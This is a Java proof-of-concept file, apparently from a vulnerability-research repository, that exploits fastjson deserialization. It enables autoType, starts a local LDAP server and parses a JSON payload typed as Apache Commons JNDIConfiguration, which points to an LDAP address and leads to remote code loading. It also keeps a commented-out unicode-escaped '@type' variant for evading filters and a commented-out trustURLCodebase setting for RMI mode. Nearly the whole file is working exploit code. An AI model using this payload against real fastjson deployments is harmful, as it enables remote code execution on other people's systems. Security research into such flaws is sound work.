package com.threedr3am.bug.fastjson;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;
import com.threedr3am.bug.server.LdapServer;

/**
 * 挖洞
 *
 * @author threedr3am
 */
public class TestPoc {
  static {
    //rmi server示例
//    RmiServer.run();

    //ldap server示例
    LdapServer.run();
  }

  public static void main(String[] args) {
    //TODO 使用rmi server模式时，jdk版本高的需要开启URLCodebase trust
//    System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase","true");
    ParserConfig.getGlobalInstance().setAutoTypeSupport(true);

//    String payload = "{\"@\\u0074ype\":\"org.apache.commons.configuration.JNDIConfiguration\",\"jndiLocation\":\"ldap://localhost:43658/Calc\"}";//ldap方式
    String payload = "{\"@type\":\"org.apache.commons.configuration.JNDIConfiguration\",\"jndiLocation\":\"ldap://localhost:43658/Calc\"}";//ldap方式
    JSON.parse(payload);
  }
}
